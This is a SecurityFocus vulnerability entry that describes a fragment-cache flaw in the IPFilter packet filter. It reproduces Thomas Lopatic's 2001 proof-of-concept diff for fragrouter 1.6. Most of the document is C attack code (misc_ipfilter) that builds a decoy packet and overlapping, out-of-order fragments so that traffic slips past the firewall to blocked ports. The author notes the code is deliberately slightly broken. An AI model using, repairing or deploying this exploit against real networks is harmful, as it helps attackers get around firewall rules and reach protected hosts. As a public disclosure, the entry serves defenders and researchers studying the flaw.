source: http://www.securityfocus.com/bid/2545/info

IPFilter is a packet filtering implementation that is in wide use on a variety of Unix systems.

There exists a vulnerability in IPFilter that can allow an attacker to communicate with blocked ports on hosts behind an IPFilter firewall.

The vulnerability is the result of IPFilter caching the decision to forward or drop a fragment, and applying this decision to other IP fragments with the same IP id. Even when a fragment is an 'initial' fragment (fragment with a fragment offset of 0) which may contain a TCP or UDP header, it will be evaluated based on the decision cache.

As a result, an attacker can establish a 'permit' decision cache in an IPFilter firewall and then successfully pass fragments with arbitrary UDP or TCP headers through the firewall bypassing the ruleset. 

# Originally from Thomas Lopatic's advisory,
# posted to Bugtraq on April 9, 2001.
# http://www.securityfocus.com/archive/1/174913

Demonstration source code
-------------------------

These are the - intentionally slightly broken - diffs to be applied to
fragrouter 1.6 to implement the described attack. Supply the "-M3"
option to fragrouter and route all your packets to the fragrouter host
to comfortably walk through an IP Filter installation that exposes the
described vulnerability.

---- cut here ----
diff -c -r fragrouter-1.6.orig/attack.c fragrouter-1.6/attack.c
*** fragrouter-1.6.orig/attack.c	Tue Sep 21 17:16:59 1999
--- fragrouter-1.6/attack.c	Sat Apr  7 16:59:05 2001
***************
*** 126,132 ****
    NULL, /* ATTACK_MISC */
    "misc-1: Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/",
    "misc-2: Linux IP chains - http://www.dataprotect.com/ipchains/",
!   NULL,
    NULL,
    NULL,
    NULL,
--- 126,132 ----
    NULL, /* ATTACK_MISC */
    "misc-1: Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/",
    "misc-2: Linux IP chains - http://www.dataprotect.com/ipchains/",
!   "misc-3: IP Filter - consult the bugtraq archives for April 2001 :-)",
    NULL,
    NULL,
    NULL,
***************
*** 209,214 ****
--- 209,217 ----
    }
    if (attack_num == 2) {
      frag = misc_linuxipchains(pkt, len);
+   }
+   if (attack_num == 3) {
+     frag = misc_ipfilter(pkt, len);
    }
    if (frag) {
      send_list(frag->head);
diff -c -r fragrouter-1.6.orig/misc.c fragrouter-1.6/misc.c
*** fragrouter-1.6.orig/misc.c	Tue Sep 21 17:14:07 1999
--- fragrouter-1.6/misc.c	Sat Apr  7 17:15:56 2001
***************
*** 206,208 ****
--- 206,422 ----
    
    return (list->head);
  }
+ 
+ /*
+  *    This demonstrates a fragmentation vulnerability in IP Filter.
+  *
+  *    The code needs a small corretion to work properly.
+  *
+  *    Thomas Lopatic, 2001-04-06
+  */
+ 
+ /*
+  *    These are the ports that we have access to.
+  */
+ 
+ #define IPFILTER_OPEN_TCP_PORT 22
+ #define IPFILTER_OPEN_UDP_PORT 53
+ 
+ ELEM *
+ misc_ipfilter(u_char *pkt, int pktlen)
+ {
+   ELEM *new, *list = NULL;
+   struct ip *iph;
+   unsigned char *frag[3], *mod, *payload;
+   int i, hlen, off, len[3], copy, rest;
+   static short id = 1;
+ 
+   iph = (struct ip *)pkt;
+ 
+   if (iph->ip_p != IPPROTO_UDP && iph->ip_p != IPPROTO_TCP)
+     return NULL;
+ 
+   iph->ip_id = htons(id);
+ 
+   if (++id == 0)
+     ++id;
+ 
+   hlen = iph->ip_hl << 2;
+ 
+   payload = pkt + hlen;
+   rest = pktlen - hlen;
+ 
+   for (i = 0; i < 3; i++) {
+ 
+     /*
+      *    Select the offset and the length for each fragment
+      *    of the decoy packet.
+      */
+ 
+     switch (i) {
+     case 0:
+       off = IP_MF;
+       if (iph->ip_p == IPPROTO_UDP)
+ 	len[i] = 8;
+       else
+ 	len[i] = 24;
+       break;
+ 
+     case 1:
+       if (iph->ip_p == IPPROTO_UDP)
+ 	off = 1 | IP_MF;
+       else
+ 	off = 3 | IP_MF;
+       len[i] = 8;
+       break;
+ 
+     default:
+       if (iph->ip_p == IPPROTO_UDP)
+ 	off = 2;
+       else
+ 	off = 4;
+       if (rest > 0)
+ 	len[i] = rest;
+       else
+ 	len[i] = 1;
+       break;
+     }
+ 
+     /*
+      *    Create the fragment.
+      */
+ 
+     if ((frag[i] = malloc(hlen + len[i])) == NULL) {
+       while (--i > 0)
+ 	free(frag[i]);
+       return NULL;
+     }
+ 
+     memcpy(frag[i], pkt, hlen);
+ 
+     /*
+      *    Copy a piece of payload and pad with null
+      *    bytes if necessary.
+      */
+ 
+     copy = len[i];
+ 
+     if (rest < copy)
+        copy = rest;
+ 
+     if (copy > 0) {
+       memcpy(frag[i] + hlen, payload, copy);
+       payload += copy;
+       rest -= copy;
+     }
+ 
+     if (copy < len[i])
+       memset(frag[i] + hlen + copy, 0, len[i] - copy);
+     
+     /*
+      *    No need to adjust the checksum.
+      *    It is not verified by IP Filter.
+      */
+ 
+     if (i == 0)
+       *(unsigned short *)(frag[i] + hlen + 2) =
+ 	(iph->ip_p == IPPROTO_UDP) ? htons(IPFILTER_OPEN_UDP_PORT) :
+ 	  htons(IPFILTER_OPEN_TCP_PORT);
+ 
+     /*
+      *    Fix the IP header.
+      */
+ 
+     iph = (struct ip *)frag[i];
+ 
+     iph->ip_len = htons((short)(hlen + len[i]));
+     iph->ip_off = htons((short)off);
+   }
+ 
+   if (i == 3)
+     return NULL;
+ 
+   /*
+    *    First have IP Filter create a state-table entry using
+    *    the original packet with a modified destination port.
+    */
+ 
+   if ((mod = malloc(pktlen)) == NULL) {
+     free(frag[0]);
+     free(frag[1]);
+     free(frag[2]);
+     return NULL;
+   }
+ 
+   memcpy(mod, pkt, pktlen);
+ 
+   *(unsigned short *)(mod + hlen + 2) =
+     (iph->ip_p == IPPROTO_UDP) ? htons(IPFILTER_OPEN_UDP_PORT) :
+       htons(IPFILTER_OPEN_TCP_PORT);
+ 
+   new = list_elem(mod, pktlen);
+   free(mod);
+ 
+   if (new == NULL) {
+     free(frag[0]);
+     free(frag[1]);
+     free(frag[2]);
+     return NULL;
+   }
+ 
+   list = list_add(list, new);
+ 
+   /*
+    *    Then fragment #1 goes first...
+    */
+ 
+   new = list_elem(frag[0], len[0] + hlen);
+   free(frag[0]);
+ 
+   if (new == NULL) {
+     free(frag[1]);
+     free(frag[2]);
+     return NULL;
+   }
+ 
+   list = list_add(list, new);
+ 
+   /*
+    *    ... then fragment #3 (out of order)...
+    */
+ 
+   new = list_elem(frag[2], len[2] + hlen);
+   free(frag[2]);
+ 
+   if (new == NULL) {
+     free(frag[1]);
+     return NULL;
+   }
+ 
+   list = list_add(list, new);
+ 
+   /*
+    *    ... then fragment #2...
+    */
+ 
+   new = list_elem(frag[1], len[1] + hlen);
+   free(frag[1]);
+ 
+   if (new == NULL)
+     return NULL;
+ 
+   list = list_add(list, new);
+ 
+   /*
+    *    ... and finally the original packet.
+    */
+ 
+   new = list_elem(pkt, pktlen);
+ 
+   if (new == NULL)
+     return NULL;
+ 
+   list = list_add(list, new);
+ 
+   return list->head;
+ }
diff -c -r fragrouter-1.6.orig/misc.h fragrouter-1.6/misc.h
*** fragrouter-1.6.orig/misc.h	Mon Jul 26 17:08:51 1999
--- fragrouter-1.6/misc.h	Sat Apr  7 16:59:05 2001
***************
*** 45,48 ****
--- 45,50 ----
  
  ELEM *misc_linuxipchains(u_char *pkt, int pktlen);
  
+ ELEM *misc_ipfilter(u_char *pkt, int pktlen);
+ 
  #endif /* MISC_H */